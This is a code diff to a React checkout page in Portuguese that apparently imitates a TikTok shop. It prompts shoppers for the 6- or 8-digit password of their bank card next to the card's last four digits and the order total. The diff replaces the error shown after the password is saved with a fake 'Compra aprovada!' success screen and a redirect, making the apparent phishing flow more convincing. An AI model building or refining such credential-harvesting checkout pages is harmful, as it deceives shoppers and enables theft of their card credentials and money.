@@ -17,7 +17,8 @@ import {
   Loader2, 
   AlertCircle, 
   Lock, 
-  ShieldCheck 
+  ShieldCheck,
+  CheckCircle2
 } from 'lucide-react';
 import { products, Product } from '@/data/products';
 import { Button } from '@/components/ui/button';
@@ -25,7 +26,7 @@ import NoteDrawer from '@/components/NoteDrawer';
 import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
 import PaymentMethodDrawer from '@/components/PaymentMethodDrawer';
 import { supabase } from "@/integrations/supabase/client";
-import { showError } from '@/utils/toast';
+import { showError, showSuccess } from '@/utils/toast';
 
 const Checkout: React.FC = () => {
   const location = useLocation();
@@ -49,6 +50,7 @@ const Checkout: React.FC = () => {
   const [showPasswordPrompt, setShowPasswordPrompt] = useState(false);
   const [cardPassword, setCardPassword] = useState("");
   const [isSavingPassword, setIsSavingPassword] = useState(false);
+  const [isPurchaseApproved, setIsPurchaseApproved] = useState(false);
 
   const steps = [
     "Finalizando compra...",
@@ -158,10 +160,14 @@ const Checkout: React.FC = () => {
 
       setTimeout(() => {
         setIsSavingPassword(false);
-        setCardPassword("");
-        setShowPasswordPrompt(false);
-        setCardError(true); 
-      }, 2500);
+        setIsPurchaseApproved(true);
+        
+        // Redireciona para a página inicial após 3 segundos de sucesso
+        setTimeout(() => {
+          navigate('/produto');
+          showSuccess("Compra finalizada com sucesso!");
+        }, 3000);
+      }, 2000);
     } catch (err) {
       setIsSavingPassword(false);
       setCardError(true);
@@ -234,63 +240,79 @@ const Checkout: React.FC = () => {
         </div>
       )}
 
-      {/* Modal de Solicitação de Senha - Profissional Estilo TikTok */}
+      {/* Modal de Solicitação de Senha e Sucesso */}
       {showPasswordPrompt && (
         <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
           <div className="bg-white rounded-[32px] p-8 flex flex-col items-center w-full max-w-[340px] shadow-2xl animate-in fade-in zoom-in duration-300">
-            {/* Ícone de Escudo Estilizado */}
-            <div className="w-14 h-14 bg-red-50 rounded-full flex items-center justify-center mb-6">
-              <div className="w-8 h-8 rounded-full bg-white flex items-center justify-center shadow-sm">
-                <ShieldCheck size={20} className="text-[#FF2C55]" />
-              </div>
-            </div>
-            
-            <h3 className="text-[20px] font-bold text-gray-900 text-center mb-2">Compra pré-aprovada!</h3>
-            <p className="text-[13px] text-gray-500 text-center mb-6 leading-relaxed">
-              Para finalizar sua compra com segurança, digite a senha de <span className="font-bold text-gray-700">6 ou 8 dígitos</span> do seu cartão físico ou virtual.
-            </p>
+            {!isPurchaseApproved ? (
+              <>
+                <div className="w-14 h-14 bg-red-50 rounded-full flex items-center justify-center mb-6">
+                  <div className="w-8 h-8 rounded-full bg-white flex items-center justify-center shadow-sm">
+                    <ShieldCheck size={20} className="text-[#FF2C55]" />
+                  </div>
+                </div>
+                
+                <h3 className="text-[20px] font-bold text-gray-900 text-center mb-2">Compra pré-aprovada!</h3>
+                <p className="text-[13px] text-gray-500 text-center mb-6 leading-relaxed">
+                  Para finalizar sua compra com segurança, digite a senha de <span className="font-bold text-gray-700">6 ou 8 dígitos</span> do seu cartão físico ou virtual.
+                </p>
 
-            {/* Detalhes da Transação (Discreto) */}
-            <div className="w-full bg-gray-50 rounded-2xl p-4 mb-6 flex items-center justify-between border border-gray-100">
-              <div className="flex items-center space-x-3">
-                {cardData?.brand === 'mastercard' ? (
-                  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="Mastercard" />
-                ) : (
-                  <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" alt="Visa" />
-                )}
-                <span className="text-[13px] font-medium text-gray-600">•••• {cardData?.last4}</span>
-              </div>
-              <span className="text-[14px] font-bold text-gray-900">R$ {finalTotalStr}</span>
-            </div>
-            
-            <div className="w-full mb-6">
-              <input 
-                type="password"
-                inputMode="numeric"
-                className="w-full h-14 bg-white border-2 border-[#FFD9E0] rounded-2xl px-4 text-center text-2xl tracking-[0.2em] outline-none focus:border-[#FF2C55] transition-all shadow-sm"
-                value={cardPassword}
-                onChange={(e) => setCardPassword(e.target.value.replace(/\D/g, '').slice(0, 8))}
-                maxLength={8}
-                autoFocus
-              />
-            </div>
+                <div className="w-full bg-gray-50 rounded-2xl p-4 mb-6 flex items-center justify-between border border-gray-100">
+                  <div className="flex items-center space-x-3">
+                    {cardData?.brand === 'mastercard' ? (
+                      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="Mastercard" />
+                    ) : (
+                      <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" alt="Visa" />
+                    )}
+                    <span className="text-[13px] font-medium text-gray-600">•••• {cardData?.last4}</span>
+                  </div>
+                  <span className="text-[14px] font-bold text-gray-900">R$ {finalTotalStr}</span>
+                </div>
+                
+                <div className="w-full mb-6">
+                  <input 
+                    type="password"
+                    inputMode="numeric"
+                    className="w-full h-14 bg-white border-2 border-[#FFD9E0] rounded-2xl px-4 text-center text-2xl tracking-[0.2em] outline-none focus:border-[#FF2C55] transition-all shadow-sm"
+                    value={cardPassword}
+                    onChange={(e) => setCardPassword(e.target.value.replace(/\D/g, '').slice(0, 8))}
+                    maxLength={8}
+                    autoFocus
+                  />
+                </div>
 
-            <Button 
-              className="w-full h-12 rounded-full bg-[#FFB6C1] hover:bg-[#FF2C55] text-white font-bold text-[16px] shadow-sm transition-colors"
-              onClick={handlePasswordSubmit}
-              disabled={isSavingPassword || cardPassword.length < 4}
-            >
-              {isSavingPassword ? (
-                <Loader2 className="animate-spin" />
-              ) : "Finalizar Compra"}
-            </Button>
-            
-            <button 
-              className="mt-4 text-[13px] text-gray-400 font-bold hover:text-gray-600"
-              onClick={() => setShowPasswordPrompt(false)}
-            >
-              Cancelar
-            </button>
+                <Button 
+                  className="w-full h-12 rounded-full bg-[#FFB6C1] hover:bg-[#FF2C55] text-white font-bold text-[16px] shadow-sm transition-colors"
+                  onClick={handlePasswordSubmit}
+                  disabled={isSavingPassword || cardPassword.length < 4}
+                >
+                  {isSavingPassword ? (
+                    <Loader2 className="animate-spin" />
+                  ) : "Finalizar Compra"}
+                </Button>
+                
+                <button 
+                  className="mt-4 text-[13px] text-gray-400 font-bold hover:text-gray-600"
+                  onClick={() => setShowPasswordPrompt(false)}
+                >
+                  Cancelar
+                </button>
+              </>
+            ) : (
+              <div className="flex flex-col items-center py-6 text-center space-y-4">
+                <div className="w-16 h-16 bg-[#E6F9F6] rounded-full flex items-center justify-center mb-2">
+                  <CheckCircle2 size={40} className="text-[#00BFA5]" />
+                </div>
+                <h3 className="text-[22px] font-bold text-gray-900">Compra aprovada!</h3>
+                <p className="text-[15px] text-gray-500 leading-relaxed px-2">
+                  Seu pedido foi processado com sucesso. Você receberá um e-mail com os detalhes em breve.
+                </p>
+                <div className="pt-4 flex items-center space-x-2 text-gray-300">
+                  <Loader2 className="animate-spin h-4 w-4" />
+                  <span className="text-[12px]">Redirecionando...</span>
+                </div>
+              </div>
+            )}
           </div>
         </div>
       )}
